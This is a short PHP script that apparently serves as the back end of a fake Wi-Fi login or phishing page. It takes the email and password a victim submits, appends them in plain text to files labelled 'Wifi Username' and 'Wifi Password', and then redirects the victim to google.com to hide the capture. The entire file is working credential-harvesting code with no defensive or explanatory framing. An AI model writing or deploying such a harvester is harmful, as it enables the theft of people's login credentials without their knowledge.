<?php

file_put_contents("usernames.txt", "Wifi Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Wifi Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.google.com');
?>
